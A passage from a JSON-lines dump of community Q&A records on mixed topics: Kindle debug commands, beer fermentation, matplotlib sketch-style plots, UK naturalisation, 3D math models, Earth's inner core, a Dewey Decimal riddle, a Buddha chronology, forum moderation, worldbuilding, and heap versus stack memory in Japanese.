this:\n;dm - Dump messages to /documents\n;dh - Dump cvm heap\n;dt - Dump cvm stack\n;shpm - set device to shipping mode\n;urst - Reset user partition, deletes content of hidden System folder, Audible folder, Documents and tts folder. \n        Before using do a complete backup of your device\n;debugPaint - log painting functions\n;debugPref - pref level logging\n;dP - alias of ;debugPref\n;311 - change carrier settings\n;411 - server information\n;611 - wan information\n;711 - wifi information\n;fc-cache - updates fontconfig's cache, then restart the framework\n;setTime - sets kindle time to unix clock\n;st - alias of ;setTime (format: yyyy-mm-dd HH:MM – e.g.: ;st 2012-07-22 17:59)\n~ds - Never show screen saver   (then you cannot lock the kindle till next reboot. \n                                 Rebooting the Kindle will restore the screen saver \n                                 lock and, hopefully, everything goes fine!)\n\nThe following are apparently Paperwhite-only, but I can't verify this:\n\";dm\" : \"/usr/bin/dm.sh\",\n\";dmcc\" : \"/usr/local/bin/dmcc.sh\",\n\";dh\" : \"/usr/bin/dh.sh\",\n\";dt\" : \"/usr/bin/dt.sh\",\n\";wifipopup\" : \"/usr/local/bin/wifipopup.sh\",\n\";sandbox\" : \"/usr/local/bin/sandbox.sh\",\n\";sbx\" : \"/usr/local/bin/sandbox.sh\",\n\";shpm\" : \"/usr/sbin/shipping_mode\",\n\";lzzl\" : \"/usr/sbin/shipping_mode\",\n\";urst\" : \"/usr/sbin/userstore_reset\",\n\";usbnetwork\" : \"/usr/local/bin/usbnetwork.sh\",\n\";un\" : \"/usr/local/bin/usbnetwork.sh\",\n\";di\" : \"/usr/local/bin/indexerdisable.sh\",\n\"`stopIndexing\" : \"/usr/local/bin/indexerstop.sh\",\n\"`startIndexing\" : \"/usr/local/bin/indexerenable.sh\",\n\"`disableIndexing\" : \"/usr/local/bin/indexerdisable.sh\",\n\"`indexStatus\" : \"/usr/local/bin/indexstatus.sh\",\n\";ddc\" : \"/usr/local/bin/dynconfig.sh\",\n\";resetConfig\" : \"/usr/local/bin/resetConfig.sh\",\n\";rc\" : \"/usr/local/bin/resetConfig.sh\",\n\";twoFingerChromeOn\" : \"/usr/local/bin/altChrome.sh 1\",\n\";homeKeyChromeOn\" : \"/usr/local/bin/altChrome.sh 2\",\n\";normalChrome\" : \"/usr/local/bin/altChrome 0\",\n\";debugOn\" : \"/usr/bin/debugOn.sh\",\n\";debugPaint\" : \"/usr/bin/debugPaint.sh\",\n\";debugOff\" : \"/usr/bin/debugOff.sh\",\n\";debugPerf\" : \"/usr/bin/debugPerf.sh\",\n\";dP\" : \"/usr/bin/debugPerf.sh\",\n\";311\" : \"/usr/bin/311.sh\",\n\";411\" : \"/usr/bin/411.sh\",\n\";611\" : \"/usr/bin/611.sh\",\n\";711\" : \"/usr/bin/711.sh\",\n\";setTime\" : \"/usr/bin/dateTime.sh\",\n\";st\" : \"/usr/bin/dateTime.sh\",\n\"~ds\" : \"/usr/bin/ds.sh\",\n\";toggleLight\" : \"/usr/bin/light.sh\",\n\";fc-cache\" : \"/usr/bin/fc-cache.sh\",\n\";htmlViewer\" : \"/usr/local/bin/htmlViewer.sh\",\n\";installHtml\" : \"/usr/local/bin/installHtmlViewer.sh\",\n\";merchant\" : \"/usr/local/bin/merchant.sh\",\n\";updateCamp\" : \"/usr/bin/updateCamp.sh\"\n\nSource\nHere is an interesting tutorial on how to root your Kindle (not directly relevant to the question, in that it's not just a list of search commands, but relevant to Kindle hacking generally).\n", "question_score": "27", "answer_score": 19}
{"title": "What does “bottom fermented” mean?", "description": "During a conversation a friend of mine mentioned something about \nBottom fermentation and I did not fully understand what this was. I understand when something is fermented, but what is the difference when talking about bottom fermentation?\nDoes this process have a effect of the type of drink produced or taste it has ?\n", "answer": "\"Bottom fermentation\" is one of the two main types of fermentation which take place during beer production; the other being \"top fermentation\". A third less common type would be spontaneous fermentation (a natural beer fermentation process taking place in the wild). Typically, only one fermentation process occurs during production (either bottom, top, or spontaneous fermentation). It basically describes what happens to the yeast during fermentation- some yeast float to the top of the liquid during fermentation, while some types of yeast sink to the bottom. Which type of fermentation takes place, depends on the type of yeast used in the process. So to answer your question, if it effects the type of drink (and taste), the answer is yes. It's not so much whether the yeast sink to the bottom or float to the top that affects the taste/style, but it is rather due to the type of yeast which determines what will happen to during fermentation (float to top/sink to bottom). For instance, lager strains of yeast typically float to the bottom. \nFrom Beeradvocate.com: \n\"Some of the lager styles made from bottom-fermenting yeasts are Pilsners, Dortmunders, Märzen, Bocks, and American malt liquors.\"\n\"Top-fermenting yeasts are used for brewing ales, porters, stouts, Altbier, Kölsch, and wheat beers.\"\nA more in-depth summary can be seen at the Beer Advocate's Yeast Guide.\n", "question_score": "7", "answer_score": 10}
{"title": "Software to 'sketch' graphs", "description": "I'm looking for free Windows software or a web app that lets me compose simple graphs with a 'sketch' style, as if drawn freehand. I want to use them to illustrate points made in a text (blog).\nRequirements:\n\nColor, maybe styles\nBe able to put some ticks/data points on the axis\nDifferent graph types (lines, bars); 2D is good enough\nAbility to add some text in the same style (although that can probably be done later in any image editor)\nFree to publish the graphs, a small corner logo/watermark would be OK\nI would primarily use it 'freehand draw' a graph, but maybe actual data input that generates the graph will come in handy too\n\nSome examples I found doing a Google image search for 'sketch graph':\n\n", "answer": "Python with numpy and matplotlib will let you rapidly draw a wide range of graphs and includes an xkcd plotting style, (based on XKCD cartoons).\nAll of the above are:\n\nFree, Gratis & Open Source\nCross Platform\n\nTo cover your requirements:\n\nColor, maybe styles Colour definitely\nBe able to put some ticks/data points on the axis No Problem\nDifferent graph types (lines, bars); 2D is good enough The XKCD style can be applied to just about any of the matplotlib 2D & 3D graph types you can even have 2/3D animated plots\nAbility to add some text in the same style (although that can probably be done later in any image editor) It is there already.\nFree to publish the graphs, a small corner logo/watermark would be OK Completely free, no logo or watermark unless you choose to add one.\nI would primarily use it 'freehand draw' a graph, but maybe actual data input that generates the graph will come in handy too No freehand but you can very quickly plug in rough sample data. note that you can also use python to query web, database, file or physical sources\n\nNote that you can save your plots as png, eps, jpeg, pdf, pgf, ps, svg, tiff, etc.\nExample code\nDemo from the gallery\nimport matplotlib.pyplot as plt\nimport numpy as np\n\nwith plt.xkcd():\n    # Based on \"Stove Ownership\" from XKCD by Randall Monroe\n    # http://xkcd.com/418/\n\n    fig = plt.figure()\n    ax = fig.add_axes((0.1, 0.2, 0.8, 0.7))\n    ax.spines['right'].set_color('none')\n    ax.spines['top'].set_color('none')\n    plt.xticks([])\n    plt.yticks([])\n    ax.set_ylim([-30, 10])\n\n    data = np.ones(100)\n    data[70:] -= np.arange(30)\n\n    plt.annotate(\n        'THE DAY I REALIZED\\nI COULD COOK BACON\\nWHENEVER I WANTED',\n        xy=(70, 1), arrowprops=dict(arrowstyle='->'), xytext=(15, -10))\n\n    plt.plot(data)\n\n    plt.xlabel('time')\n    plt.ylabel('my overall health')\n    fig.text(\n        0.5, 0.05,\n        '\"Stove Ownership\" from xkcd by Randall Monroe',\n        ha='center')\n\n    # Based on \"The Data So Far\" from XKCD by Randall Monroe\n    # http://xkcd.com/373/\n\n    fig = plt.figure()\n    ax = fig.add_axes((0.1, 0.2, 0.8, 0.7))\n    ax.bar([-0.125, 1.0 - 0.125], [0, 100], 0.25)\n    ax.spines['right'].set_color('none')\n    ax.spines['top'].set_color('none')\n    ax.xaxis.set_ticks_position('bottom')\n    ax.set_xticks([0, 1])\n    ax.set_xlim([-0.5, 1.5])\n    ax.set_ylim([0, 110])\n    ax.set_xticklabels(['CONFIRMED BY\\nEXPERIMENT', 'REFUTED BY\\nEXPERIMENT'])\n    plt.yticks([])\n\n    plt.title(\"CLAIMS OF SUPERNATURAL POWERS\")\n\n    fig.text(\n        0.5, 0.05,\n        '\"The Data So Far\" from xkcd by Randall Monroe',\n        ha='center')\n\nplt.show()\n\nIt even works with 3D plots as shown in the development process on this ticket:\n\n", "question_score": "7", "answer_score": 13}
{"title": "How do I get a British citizenship?", "description": "I want to move to United Kingdom and I already know that I want to get a citizenship.\nWhat can I prepare in advance so I can spread the cost over before applying. Are there any tests to get a citizenship. Do I need to earn a certain salary to qualify? Does my nationality or ethnic origin affect the processes?\nAssuming that all my Visas are current and I am allowed to work in UK.\n", "answer": "The guidelines of becoming a British Citizen are pretty straight forward and available online:\n\nThere are different ways to become a British citizen. The most common\n  is called ‘naturalisation’.\nYou can apply for British citizenship by naturalisation if:\n\nyou’re 18 or over\nyou’re of sound mind\nyou’re of good character\nyou’ll continue to live in the UK\nyou have met the knowledge of English and life in the UK requirements\n\nYou must usually also have:\n\nlived in the UK for at least the 5 years before the date of your application\nspent no more than 450 days outside the UK during those 5 years\nspent no more than 90 days outside the UK in the last 12 months\nbeen granted indefinite leave to stay in the UK, ie there’s no specific date that you have to leave\nhad indefinite leave to stay in the UK for the last 12 months\n  \nnot broken any immigration laws while in the UK\n\nThe website goes on to explain that \"There are different requirements if your spouse or civil partner is a British citizen.\" Those requirements can be found at https://www.gov.uk/becoming-a-british-citizen/if-your-spouse-is-a-british-citizen.\nSo to answer your specific questions:\n\nWhat can I prepare in advance so I can spread the cost over before applying.\n\nThere are 3 aspects of getting citizenship that cost money. The first is applying for citizenship (currently £874). The second is taking the Life in the UK test (currently £50). This can be taken as part of the settlement process. The third is settlement. There are a number of different routes for settlement each with their own costs. Details are at https://contact-ukba.homeoffice.gov.uk/visas-immigration/settlement/applicationtypes/. One route is through SET(O) (currently £1839). Settlement does not expire so you can space out the settlement and citizenship fees.\n\nAre there any tests to get a citizenship.\n\nYes, the Life in the UK test mentioned above\n\nDo I need to earn over a certain amount yearly to qualify\n\nNot for citizenship per se, but there is often an income requirement to get indefinite leave to remain/settlement\n\nDoes my nationality or ethnic origin involve different processes\n\nAgain, in general not for citizenship, but can for settlement.\n", "question_score": "9", "answer_score": 13}
{"title": "Making physical 3D models", "description": "I was thinking to make classroom illustrations of some 3D mathematical objects, such as graphs of 2 variable functions, minimal surfaces, etc.\nMy question is, what would be a good way to go about it? I thought about 3D printers, but I have no experience with it whatsoever. I would really appreciate if someone with an experience with these things point me to a right direction.\n", "answer": "Here are some examples of physical 3D-models of mathematical surfaces.\nThey might give you some ideas.\n\nhttps://raisingcalculus.winona.edu/ (Raising Calculus to the Surface - Aaron Wangberg - Winona State)\nuses a plastic mold of a surface that students can study (and markup with a dry-erase marker).\n\nhttp://www.3dprintmath.com/ (Visualizing Mathematics with 3D Printing - Henry Segerman - Oklahoma State)\nuses a 3D-printer to make various objects\n\nhttps://math.okstate.edu/people/segerman/talks/design_of_3d_printed_math_art.pdf\nhttps://youtu.be/JIM-IWh_-n0 (video)\nhttps://tangible.media.mit.edu/project/inform/ ( inFORM - MIT Media Lab -Tangible Media Group)\nis a Dynamic Shape Display that can render 3D content physically.\n\nhttp://pi.math.cornell.edu/~dtaimina/ (Daina Taimina - Cornell)\ncreates surfaces for hyperbolic space by crocheting\n\nhttps://www.youtube.com/watch?v=w1TBZhd-sN0 (video)\nhttp://pi.math.cornell.edu/~dwh/papers/crochet/crochet.html\nhttp://www.andrewlipson.com/mathlego.htm (Andrew Lipson's Mathematical LEGO® Sculptures)\ncreates mathematical surfaces with LEGO.\n\nOf course, it's probably easy to find paper models of various solids (e.g. Paper Icosahedron, etc...) For example, https://www.korthalsaltes.com/\n\nUPDATED:\n\nhttps://www.geogebra.org/3Dprinting\n3D Printing with GeoGebra\nby Diego Lieban\n\"Create your own 3D shapes with GeoGebra and a 3D printer. In this tutorial you will learn how easy it is to export 3D constructions from our GeoGebra 3D Graphing app to the STL file format which can be printed directly on any 3D printer.\"\n\nIt seems that it uses https://www.geogebra.org/3d and the STL output from the \"Download as\" menu item.\n\n", "question_score": "8", "answer_score": 11}
{"title": "How isotropic is the Earth's inner core boundary?", "description": "Often, in texts (particularly for schools etc) depict a smooth spherical isotropic boundary between the inner and outer core, as shown in the image from this USGS public education page:\n \nThe inner core boundary is between the inner and outer core layers.\nHow isotropic is the Earth's inner core boundary?\nRelated questions\nHow can we guess the size of the Earth's inner core(and what it's made of)?\nWhy does seismic activity shed light on the inner core rigidity?\nWhy is Earth's inner core solid?\nThese are related but this question is about the nature of the boundary between the inner and outer core.\n", "answer": "Some recent geophysical observations by Dai et al. (2012) (1) showed that compressional seismic waves reflected off the inner core boundary (ICB) exhibit significant variations in:\n\ntravel time, of the order of -2 to 2.5 seconds.\namplitude, by up to a factor greater than 4 (up to a factor of 6 oberved by Li et al. 2014 (2)).\n\nThese observations, according to Dai et al. (2012) (1) suggest that the ICB is irregular, with possible height differences of up to 14 km, across a distance of 6 km, and 4-8 km over a distance of 2-4 km.\nDai et al. (2012) (1) suggest that these variations are indicative of thermochemical deformation of the ICB. An alternative explanation presented by Li et al. (2014) (2), after numerical analyses of seismic traces, taking into account the effects of shallower structures, suggest that the ICB being a several-kilometre-thick 'mushy' layer indicative of a gradual transition between the inner and outer core.\nThe actual nature of the ICB is not completely understood, a recent theory by Vamos and Suciu (2014) (3) suggest that the anisotropy of seismic observations could be a result of a de-centred core due to interactions with the flow and the magnetic field inside the outer core. \nObservations by Wen (2006) (4) found that seismic traces from the same location taken at different times posessed different return times in the space of ~10 years, suggesting that deformations (as later described by Dai et al (1)) occur on a differentially rotating inner core, alternatively, Wen (4) suggests that the size of the inner core changes with time.\nReferences\n(1) Dai et al. 2012, Irregular topography at the Earth’s inner core boundary, PNAS\n(2) Li et al. 2014, Notes on the variability of reflected inner core phases, Earthquake Science\n(3) Vamos and Suciu 2014, Geophysical implications of a decentered inner core, arXiv.org\n(4) Wen 2006, Localized Temporal Change of the Earth's Inner Core Boundary, Science\n", "question_score": "9", "answer_score": 10}
{"title": "Do I Work with an Orangutan?", "description": "This morning I found myself face-down in front of a large building. It was obvious that I had taken a great fall from one of the rooms above me, but now I apparently had amnesia.\nI went in.\nI could tell that the building had been built by an American architect, as the ground floor was designated as the first floor, and I guessed that there might be a basement below me.\nI started going into random rooms, trying to jog my memory a bit.\n1st floor: I poked my head into room 130 and saw someone with a deck of cards. She was staring intently at it, then flipped the top card over with great conviction. She then sighed sadly and scribbled something down on a notepad.  \n3rd floor: There were a bunch of unsavory mobster-types hanging out by room 364, so I kept going up.  \n4th floor: I couldn't seem to understand what anyone was talking about, so I continued up.  \n6th floor: I stopped in room 633 and mellowed out for exactly 7 minutes.  \n9th (top) floor: I looked into room 910 and was reminded that I had not looked in the basement, so I went back down for a look-see.  \nBasement: Ahhh! This was finally familiar! I snuggled right into my desk in room 25 and took a nap.   \nWhen I woke up I was home, in bed. What a strange dream that had been! Well, no worries, everyone dreams about work sometimes.  \n\nWhat is my job and where do I work?\n\n", "answer": "You are a:  \n\n Librarian working in a library   \n\nand the rooms are:  \n\n Dewey Decimal Classifications\n\n1st floor: I poked my head into room 130 and saw someone with a deck of cards. She was staring intently at it, then flipped the top card over with great conviction. She then sighed sadly and scribbled something down on a notepad.  \n\n Dewey Decimal Classification 130: Parapsychology and occultism\n The woman is attempting to divine the future, and is either attempting to predict the top card of a deck (as a self-test) or is using the deck as a divination tool (see further: Tarot cards)  \n\n3rd floor: There were a bunch of unsavory mobster-types hanging out by room 364, so I kept going up.  \n\n Dewey Decimal Classification 364: Criminology\n This is where books that study the criminal mind go, especially the minds of career criminals or particularly famous criminals.  \n\n4th floor: I couldn't seem to understand what anyone was talking about, so I continued up.  \n\n Dewey Decimal Category 400-499: Language\n Linguistics, phonology, etymology, grammar, etc. They're all here, across a variety of languages, including \"Hellenic languages; classical Greek\" (480) and \"Austronesian and other languages\" (499)  \n\n6th floor: I stopped in room 633 and mellowed out for exactly 7 minutes.  \n\n Dewey Decimal Classification 633: Field and Plantation Crops\n 7 minutes is exactly 420 seconds.  \n\n9th (top) floor: I looked into room 910 and was reminded that I had not looked in the basement, so I went back down for a look-see.  \n\n Dewey Decimal Classification 910: Geography and Travel\n Where did you come from? Where did you go?\n\nBasement: Ahhh! This was finally familiar! I snuggled right into my desk in room 25 and took a nap.  \n\n Dewey Decimal Classification 025: Library operations\n Get back to work!  \n\nConnection to title:  \n\n In Terry Pratchett's Discworld series of novels, the Librarian of the magical Unseen University is an orangutan. (Don't call him a monkey!)  \n\n", "question_score": "98", "answer_score": 96}
{"title": "What was the chronology of events in the Buddha's life?", "description": "This is the sort of question I'd find really useful to get an answer on; I'm looking for a rough chronology of the 45 years of the Buddha's (not the Bodhisatta's) life, year by year. I know there is some orthodox-approved order, I just can't find it yet. Does anyone know where it can be found, or even better can post it here?\n", "answer": "This is from Hajimi Nakamura's \"Gotama Buddha\" vol. 1\nSorry about the quality...\n\n1st         36      varanasi                migadayavana\n\n2nd         37      Vulture Peak            Veluvana\n\n3rd         38      Vulture Peak            Veluvana\n\n4th         39      Vulture Peak            Veluvana\n\n5th         40      Vesali                  Mahavana\n\n6th(1)      41      Mount Mankula           Makula mountain\n\n7th         42      Heaven of 33 [Gods]     Tavatimsa\n\n8th(2)      43      realm of Yakkhas        grove of Tesakala\n\n9th(3)      44      Kosambi                 Kosambi\n\n10th        45      Cetiyapabbata           Palelayaka\n\n11th(4)     46      realm of Yakkhas        Dakkhinagiri monastery\n\n12th(5)     47      Magadha                 Veranja\n\n13th(6)     48      realm of Yakkhas        monastery near Tsalia\n\n14th        49      Anathapindika’s Park    Jetavana monastery\n\n15th        50      Kapilavatthu            Nigrodha monastery\n\n16th        51      Kapilavatthu            Alavi\n\n17th(7)     52      Rajagaha                Veluvana\n\n18th(8)     53      Rajagaha                monastery near Tsalia\n\n19th        54      Mount Calika            Veluvana\n\n20th        55      Rajagaha                Jetavana\n\n21-24(9)    56-59   Mount Calika\n\n25-43rd     60-78   Savatthi\n\n44th        79      borders of Vajji\n\n45th        80                              Veluvana\n\nThe Buddha moved from Vaisali to Sravasti, where he spent the sixth retreat. At the end of the retreat he moved to Rajagrha (H. Kern, Manual of Indian Buddhism IStrassburg: Verlag von Karl J. Triibner, 1896], p. 31). As can be seen below as well, Kern makes conclusive statements about the chronology, perhaps based on a South Asian tradition.\nKern states that the eighth retreat was held at Crocodile Hill (Simsumara-giri), a hill in Deer Park of Bhesakalavana in the country of Bharga (Kern, Manual, p. 34).\nAccording to one Southern tradition, the Buddha spent the ninth retreat in Ghositarama in Kausambi (P. Bigandet, The Life or Legend of Caudama, vol. 1 (Rangoon) American Mission Press, 1855], p. 234). However, see Kern, Manual, p. 34.\nDuring the eleventh retreat, the Buddha stayed near Rajagrha (Kern, Manual, p. 35).\nConcerning the twelfth through fourteenth retreats, see Bigandet, Life or Legend, pp. 240—41; Kentoku Hori, Bijutsujé no Shaka (Sakyamuni in art; Tokyo: Hakubunkan, 1910), pp. 208—9. During the twelfth retreat, the Buddha stayed at a place near Veraﬁja (Kern, Manual, p. 36).\nThe thirteenth retreat was spent at sravasti and Calika (Kern, Manual, p. 36).\nThe Buddha went from Alavi to Rajagrha, and spent the seventeenth retreat in the Bamboo Grove there (Kern, Manual, p. 37).\nThe eighteenth retreat was spent on a hill near calika, the nineteenth at Venuvana, and the twentieth at Jetavana (Kern, Manual, p. 37).\nConcerning Mount Calika, Shinko Mochizuki, “Buddha jodé shijﬂgonen ni okeru agon no chiten” (The places of vassa during the forty-five years of enlightenment) (Bukkyé kenkyu 1, no. 2 [July-August 1937], p. 8) says: “If we consider calika to be in Savatthi because it was located nearby, this would mean the Buddha spent a total of twenty-five years at Savatthi.” Akanuma does not refer to the mountain in his dictionary.\n\n", "question_score": "9", "answer_score": 13}
{"title": "How should a member get the option to become a moderator?", "description": "I'm building an online community in gaming, design and development. I have a forum, website and a Wiki for us. We also provide a Teamspeak³ Server which is well visited (50 People at a time).\nHow do I choose moderators? Like the SE System, with just getting enough activity in the Community even if they are just playing the whole day? Or something like a application for the role?\n", "answer": "There are many ways you can decide on who becomes a moderator on your site(s).\n\nWait until the site has been up and running for a while and see which users have been the most helpful around the place, doing things like showing new users the ropes, flagging up questionable content, editing (if that's allowed) etc. Then approach these people to see if they want the job.\nAsk for volunteers, but make it clear that they'll be vetted. Then use the same criteria as outlined in the first point to decide who'll make a good moderator. If you ask people to post their nomination (or nominate someone else) then you can also get the feedback from other users who will undoubtedly comment on those posts.\nRun an election - get people to nominate themselves and have other users vote on who they want in the post. This is only really a viable option if you have a reasonable number of users and the community has been running for a while so there's a good chance people will know the nominees, at least to some extent.\nBuild in moderation to the system so that people with more useful activity on the site get more privileges and responsibilities. Stack Exchange does this through reputation earned by posting good content. You could use things like the number of useful edits made or posts flagged etc. To some extent how this works will depend on the system you are using and whether it allows you to track user activity in a meaningful way.\n\n", "question_score": "7", "answer_score": 11}
{"title": "When transported suddenly to ancient Persia - how to quickly show that I am from the future?", "description": "(This question is quite similar to How do you prove you're from the future?)\nI am an average person in the year 2016, living in, say, the USA. However I suddenly get transported back in time to 300 BC, to Persia. I did not prepare to this time-travel in advance. To be more precise:\n\nI'm aware that I've just undergone time-travel.\nOnly me and my clothes have undergone time-travel - nothing else (no time machine).\nI know approximately what year it is (say, within an error of century), and I know approximately where I am (mid-west Asia).\n\nWhen I land in Persia, I'm near a populated city, and two Persian \"policemen\" approach me, with their spears. I seem very alien to them, it frightens them, so they want to kill me.\nMy goal is to stay alive. I don't speak their language so it's hard to communicate with them. I need to act fast. My only chance is to show them something amazing, that I learned in the future.\nWhat can I do?\n", "answer": "First of all, if you go back to the 300BC you will find yourself in the Seleucid empire which controlled the area at the time following the division of the Macedonian empire as expanded under by Alexander the Great.\nIf any officials approach you they will most probably be either the city guard or posted soldiers in the service of Seleucus. \nUnless you've gone out of your way to look extraordinary by wearing blinky lights or the such there is no reason why these guards or soldiers would be afraid of you. They are serving in one of the most cosmopolitan areas of the time and are used to seeing people with exotic features or dress. \nDepending on the mandate of the officials they might not feel inclined to deal with you unless you try to enter the city or if you are harassing people. They are keeping watch over an area that might or might not be under threat of revolt due to the presence of occupying forces. They are busy. They don't care unless you make them care.\nThe first thing that will annoy them about you when they do care is that you are unable to make account for who you are and what you are doing there. You might be showing them some amazing things, but you don't respond when they ask you if you intend to sell the objects in the marked and you don't seem to understand that you need to pay the tax to enter the city with merchandise. You might also be an entertainer, but your show is more confusing than compelling. \nThe officials are struggling to understand why you won't leave them alone. Maybe you need assistance with something, but after a while chances are that they will begin to wonder if you are a bit crazy. Maybe they will attempt to drive you off or give you a beating to make you leave them alone. \nYou would have had a lot better chance if you had bothered to learn a bit of one of the ancient languages spoken in the area of the time or if you had brought precious metals or gems to bribe the guards to let you into the city. Once in the city you might or might not be able to find men of science and show them enough mathematics to convince them that you were worth listening to. Then after learning and perfecting their spoken language you might after some years be able to explain the concept of moving through time. Upon which you might be deemed insane, or possibly divine depending on whether they actually believe you. Either way you would have to prepare yourself for your life being changed in unpredictable ways. \nYou would probably fare better in the past if you never try to explain that you're from the future at all.\n", "question_score": "9", "answer_score": 23}
{"title": "How would flora behave on a two continent planet?", "description": "Note: This question is a follow up to this question, and hence forms part of a bigger complex of questions about geology and biology in this certain scenario.\n\nMeta: The planet consists of two enormous continents, each encompassing one of the two hemispheres (northern and southern). There are two small polar oceans (both mostly frozen over, encompassed by landmasses) that are relatively low in salt. The continents are divided by a huge, deep oceanic belt, along the equator of the planet.\nThe planet has bout 1.1 times the mass of Earth, and slightly more landmass than water (about 35% percent landmass to 65% waters).\nTectonics push plates from the equator to the poles, effectively forming mountain rings, parallel to the equator, on the continents.\nThe planet orbits at an Earth-like distance around and Sol-like sun with an Earth-like elliptical orbit.\nThe planet will have 3 satellites (aka. moons), the first is sized a trifle bigger than Earth's moon and is orbiting along the equatorial axis about the same distance as earth's moon, and the others are both about 1/3rd the size of the big moon and are at a 60° and 70° degree inclination relative to the plane of the biggest moon at less distance from the planet.\nThe planet will feature a Phlebotinum gas, providing about 400-500% the lifting capacity of helium/hydrogen (as described here).\n\nRegarding the stated facts, How would flora develop and behave on such a planet?.\nTo mention a few topics:\n\nHow many species of a given plant (e.g. trees, wheat, grasses) would evolve?\nWould there evolve different species per climate zone or would the same species rather evolve specializations?\nHow different could the flora on the northern hemisphere be from that of the southern?\n\nAddendum: This question assumes no travel of people between both continents, nor does it assume any cultivation of plants, no plantations made by humans. Best assume NO humans at all for the sake of the question.\n", "answer": "Given two polar masses totaling 35% of the planet's surface, it is useful to compute just how big those masses are. The formula for calculating area using a conical angle is $$\\omega = 2 \\pi (1 - \\cos{\\theta})$$ where $\\omega$ is in steradians and $\\theta$ is the included half-angle of the cone. Since the area of a hemisphere is $2\\pi$, $\\omega = 2.2$, and $$\\theta = 50$$\nSo the land masses will start at approximately 40 degrees of latitude. This is very bad, since the Horse Latitudes https://en.wikipedia.org/wiki/Horse_latitudes extend from about 30 to 38 degrees of latitude, with little precipitation. This will only allow the area between 38 and 40 degrees to provide moisture for the subpolar air flow which would provide moisture to the land mass. That's not much of a source, since it's only a band about 200 miles wide or less. And it gets worse.\nThe ring of mountains caused by your specified tectonics will act to produce a rain shadow to the north of the ring (in the northern hemisphere). If the mountains form a complete ring on one continent, the result will be a continental desert north (or south) of the mountains. If there are breaks in the mountain rings, moisture will push toward the poles in those areas.\nAs a result, you can expect some precipitation along the coastal shores, with temperate rain forests along the equatorial side of the mountain rings. North or south of the mountains will be extreme deserts. The cold of the ice caps will serve to sequester moisture in the ice, making the northern (above 60 degrees of latitude) desert very dry. Gaps in the mountains will allow the development of temperate grasslands and forests in the areas immediately poleward of such gaps. \nWith the existence of a 5500 mile wide ocean running completely around the planet, the pattern of trade winds (and the Intertropical Convergence Zone) there should not be much communication between the two continents, so there should be very little common in the flora and fauna of the two areas. For comparison, the existence of the Central American Seaway, with a gap on the order of 1000 km, effectively separated North and South America, allowing quite disparate populations to evolve. All of this changed about 12 million years ago with the rise of the Isthmus of Panama, and produced the Great American Interchange https://en.wikipedia.org/wiki/Great_American_Interchange. The effects of an even larger oceanic gap should be even more extreme in preventing communication.\nAs a matter of fact, unless you can provide for a land bridge between the two back in the equivalent of the Cretaceous or later, there would be no obvious reason for both continents to evolve compatible angiosperms, so the two ecosystems might be wildly different. You might well get away with asserting mammal dominance on one continent, while dinosaurs roam on the other. \n", "question_score": "9", "answer_score": 19}
{"title": "ヒープ領域とスタック領域の違いについて教えてください", "description": "ヒープ領域とスタック領域の違いについて教えてください\nひとまず以下の疑問があります。\n\nいつ確保されるのか\nどちらが早いのか\nサイズはいつ決定されているのか\nスタックに確保されているAuto変数とはなにか\nヒープ領域はなぜ、双方向リストによって構成されているのか\nスタック領域のデータ構造はどのようなものなのか\n\n追記\n\nなぜ、データ構造に違いを与えたのか\n\n", "answer": "(一般的な話を書いたら長文になってしまいました。)\nプログラムが実行時にどうメモリを使うか、については色々なやり方があって、実際に色々試されて来たのですが、その中で定番になったのが、データを寿命によって次のとおり分類する方法です。\n\nプログラムを実行する前からどのくらい必要か決まっていて、実行開始時から終了時まで存在し続けるもの\n関数/サブルーチンの実行中のみ必要で、サブルーチンを抜けたら不要になるもの\n実行してみないとどのくらい必要になるかわからないけれど、一つの関数やサブルーチンの実行を越えて存在し続ける必要があるもの\n\nCの仕様では寿命をstorage durationと呼び、上の分類はそれぞれstatic、automatic、allocatedと呼んでいます。C型の言語はこのモデルを踏襲していることが多いです。そのため、現在ではOSやシステムライブラリのレベルでこのモデルをサポートすることが多くなりました。ここでもその名称を使います。 (ここでのstaticは、Cのキーワードとしてのstaticとちょっと意味が違うので混同しないでください。Cで言うstatic変数とグローバル変数を含みます。)\nstaticなデータ領域については、コンパイル・リンクした時点でデータそれぞれに必要な大きさがわかりますから、メモリ上の相対位置も決めておくことが出来ます。OSがプログラムをロードした時点でその領域に必要なメモリが割り当てられます。\nautomaticなデータ領域は、関数の実行開始時に作り、抜ける時に破棄できます。この特徴はデータ構造としてのスタックと相性が良いのです。関数に入る時に必要な領域を「積み」、抜ける時にそれを取り除きます。呼び出しがネストしても必ず最後に積んだものから取り除けます。スタック構造は管理も簡単で(先頭のデータ位置さえ覚えておけば良い)、キャッシュとの相性も良く、automaticなデータをスタックで管理するのが一般的になり、スタック領域と呼ばれるようになりました。(歴史的には、メモリが貴重だった時代にはautomaticに相当するデータをリンクトリストで管理するシステムもあり、必ずスタックを使わねばならないということはありません。automaticなデータを管理するもっとも一般的な方法がスタックだ、ということです。)\n最近の一般的なOSでは、スレッドごとにスタック領域が設定されます。スレッドが作られた時にあらかじめ決められた大きさの仮想メモリ領域が割り当てられ、そこを使います。使い切ってしまうと例外となることが多いです。言語と処理系によっては、割り当てられた領域を使い尽くしたら領域を拡張したり、一部を次に述べるヒープに自動的に移すものもあります。\nそして最後のallocatedなデータ。これは、ある関数で確保して、その関数が戻っても使いつづけたい、というようなデータなので、automaticな領域に置くわけにはいきません。また、実行開始前にはどのくらい必要かわからないので、あらかじめ場所を決めておくわけにもいきません。そこで、メモリ空間の一定部分をこのデータ用にとっておき、必要に応じてそこから切り出して使います。データが作られる順番と破棄される順番はばらばらなので、どの順番で破棄されても良いように、データ構造に工夫が必要です。双方向リストを部分的に使うことも多いですが、この部分はプログラムの性能に大きな影響を与えるので、色々な工夫があります。ともかく、このallocatedなデータ用の領域をヒープ領域と呼びます。\nヒープはどのくらい大きくなるか事前にわからないので、手持ちが足りなくなったらOSからある程度まとまった単位でメモリをもらって拡張してゆく、というのが一般的です。\n組み込み用などメモリが限られている場合は、プログラムをロードしてstaticなデータ領域を確保したら、残りのメモリをヒープ・スタック兼用として、メモリのアドレスの上の方からスタックとして使い、下の方からヒープとして使ってゆく、なんてやり方もあります。この場合、それぞれの領域の大きさはあらかじめ決まってはいないことになります。\nプログラミング言語によっては、言語上はstatic、automatic、allocatedの区別をせず、「すべてのデータは永遠の寿命を持つ」と規定されているものもあります。現実にはそれだとメモリが足りなくなりますが、どこからもアクセスできなくなったデータはこっそり回収してしまってもプログラムの動作に影響を与えないので、そうやってシステムの方が面倒を見てくれます。現代のアーキテクチャではヒープとスタックのモデルが効率良く実行できるので、言語処理系が自動的にデータの使われ方を解析して、